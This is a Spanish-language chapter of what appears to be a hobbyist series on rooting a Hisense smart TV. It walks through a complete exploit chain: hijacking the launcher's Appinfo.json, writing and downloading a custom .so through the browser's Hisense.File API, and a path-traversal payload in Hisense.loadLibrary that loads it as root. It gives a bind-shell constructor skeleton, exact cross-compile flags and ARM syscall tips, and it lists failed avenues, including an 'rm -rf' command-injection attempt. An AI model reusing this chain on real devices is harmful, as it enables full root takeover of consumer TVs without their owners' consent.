# 03 — Conseguir root (sin exploit de memoria)

La cadena completa, paso a paso. **No** se usó ninguna vulnerabilidad de corrupción de memoria:
se usaron dos cosas que el firmware expone a propósito (escritura de archivos y carga de
bibliotecas) sin sanear el camino.

## Resumen de la cadena

```
JavaScript en el navegador de apps
   └─> Hisense.File.write()      escribe en /3rd_rw/appdata (persistente)
   └─> Hisense.File.download()   baja una .so propia a /3rd_rw/appdata
   └─> Hisense.loadLibrary('../../../../3rd_rw/appdata/libx.so')
          └─> dlopen() de la .so  → corre su constructor → uid 0
                 └─> fork + setsid + socket + bind + execve("/bin/sh")
```

> **Reconocimiento previo (sin exploit):** antes de escribir una sola línea se leyó todo el
> sistema con `file://localhost` y DevTools. El navegador lista directorios y una página HTTP
> puede leer archivos locales con XHR, porque el motor no aplica mismo origen entre `http://` y
> `file://` (el navegador corre como root). Ver
> [doc 02](02-reconocimiento-red.md#lectura-de-todo-el-sistema-de-archivos-con-filelocalhost).

## 1. El objeto `Hisense` y su API de archivos

El navegador de apps (Presto) expone un plugin `Hisense` con:

| Método | Qué hace |
|---|---|
| `Hisense.File.read(ruta, modo)` | lee archivos |
| `Hisense.File.write(ruta, datos, modo)` | **escribe** archivos |
| `Hisense.File.download(url, ruta, modo)` | descarga a disco |
| `Hisense.loadLibrary(nombre)` | **carga una biblioteca nativa** |

Las raíces de `File` son `mode` (0 = `/tmp`, 1 = `/3rd_rw/appdata`, 2 = `/mnt`, 3 = `/3rd`,
4 = `/3rd_rw`, …). `WritingAllowed` solo permite `/tmp`, `/dev/shm/shm_tmp` y **`/3rd_rw/appdata`**;
`ReadingAllowed` agrega `/3rd_rw`.

Ese último es el punto: **`/3rd_rw` es ext4 escribible y persiste entre reinicios**.

## 2. Colgarse de la lista de apps del launcher

La interfaz principal (`/3rd_rw/UI/hisenseUI/`) construye su grilla de apps leyendo
`/3rd_rw/appdata/launcher/Appinfo.json`:

```json
{ "AppInfo": [ { "AppId":"mi_app", "AppName":"Mi App", "Title":"Mi App",
                 "URL":"http://<pc>:<puerto>/pagina.html",
                 "StartCommand":"http://<pc>:<puerto>/pagina.html",
                 "StoreType":"opera" } ] }
```

Al seleccionar esa app, el launcher hace:
`sendCommndToTV(36, URL)` → `asyncStartApp("app_tv_store", …)` →
`sendAM(':am,am,:start=[tv_store,-u,<URL>]')` → el navegador abre **tu página**.

> Guardar una copia del original (`Appinfo.json.bak`) antes de tocarlo. Es el único archivo de la
> interfaz que hay que modificar.

## 3. La escritura y la descarga, desde la página

La página se sirve desde tu máquina y se abre en el televisor. Desde ahí:

```js
// escribir un archivo persistente
Hisense.File.write('prueba.txt', 'hola', 1);        // 1 = /3rd_rw/appdata

// bajar una .so propia
Hisense.File.download('http://<pc>:8080/libx.so', 'libx.so', 1);
```

## 4. El *path traversal* de `loadLibrary` (el bug real)

`libhspdk-linux.so` implementa `loadLibrary` así:

```c
OPERA_DIR = "${PWD}/opera_dir";
snprintf(path, sizeof(path), "%s/jsplugins/%s", OPERA_DIR, nombre);
```

El proceso del navegador corre con `cwd = /3rd/browser`, así que la ruta base es
`/3rd/browser/opera_dir/jsplugins/`. El nombre **no se sanea**:

```
../../../../3rd_rw/appdata/libx.so
```

Cuatro `..` desde `jsplugins` llegan a `/`:

```
/3rd/browser/opera_dir/jsplugins/  ->  opera_dir  ->  browser  ->  3rd  ->  /
```

Resultado: `dlopen("/3rd_rw/appdata/libx.so")`. Como `/3rd_rw/appdata` es escribible por el
navegador, **el archivo lo ponemos nosotros**.

## 5. La `.so` que corre como root

El constructor de la biblioteca se ejecuta al `dlopen()`, dentro del proceso del navegador, que
corre como **root**:

```c
__attribute__((constructor)) static void init(void)
{
    /* 1. fork + setsid para despegarse del navegador
       2. socket + bind + listen en un puerto
       3. dup2 a 0/1/2 y execve("/bin/sh") */
}
```

Comprobación desde la shell resultante:

```
# busybox id
uid=0(root) gid=0(root) groups=0(root)
# busybox cat /proc/self/status | grep CapEff
CapEff: 0000001fffffffff
```

## 6. La trampa del ABI (esto hace fallar el 90% de los intentos)

Todas las bibliotecas del televisor son **EABI5 soft-float**: `e_flags = 0x05000002`. Una `.so`
compilada hard-float (`0x05000400`) es **rechazada** por `dlopen` y el constructor nunca corre.

Receta que funciona:

```sh
arm-linux-gnueabi-gcc -shared -fPIC -nostdlib -Os \
    -march=armv7-a -mfloat-abi=soft \
    -fno-stack-protector -fno-asynchronous-unwind-tables \
    -o libx.so libx.c
```

Verificar:

```sh
arm-linux-gnueabi-readelf -h libx.so | grep Flags
#   Flags: 0x5000200, Version5 EABI, soft-float ABI
```

Y dos detalles que ahorran horas:

1. **Sin libc**: usar syscalls crudas. Con `-nostdlib` no hay `DT_NEEDED` y el `dlopen` no
   arrastra una segunda libc al proceso.
2. **El número de syscall va en `r7`**, no en `r0`:

```c
register long r7 __asm__("r7") = n;   /* número */
register long r0 __asm__("r0") = a;   /* argumento 1 */
__asm__ volatile ("svc 0" : "+r"(r0) : "r"(r7), "r"(r1), "r"(r2) : "memory", "cc");
```

Con el número en `r0` (convención x86) el proceso muere con **SIGILL** y no dice por qué.

## 7. Vías que se investigaron y **no** sirvieron

| Vía | Por qué no |
|---|---|
| `dialserver` (buffer overflow pre-auth) | da DoS remoto, no ejecución (ASLR sin *leak*) |
| `app_man` (`delete` → `rm -rf %s`) | no alcanzable por DIAL: los argumentos se URL-encodean |
| Inyectar un segundo comando en el FIFO de `app_man` | el dispatcher corta la línea después de `start` |
| SSHD "oculto" | `/sbin/sshd` **no existe** en ninguna versión conocida (ni 2015, ni 2019) |

## 8. Después de entrar: no dejarlo abierto

La shell del ejemplo escucha sin autenticación. Una vez adentro conviene:

1. Instalar **dropbear con clave pública** en `/data` (ver [doc 06](06-cadena-de-herramientas.md)).
2. **Matar el listener sin autenticación.**
3. Hacerlo persistente con el hook de arranque ([doc 04](04-persistencia.md)).
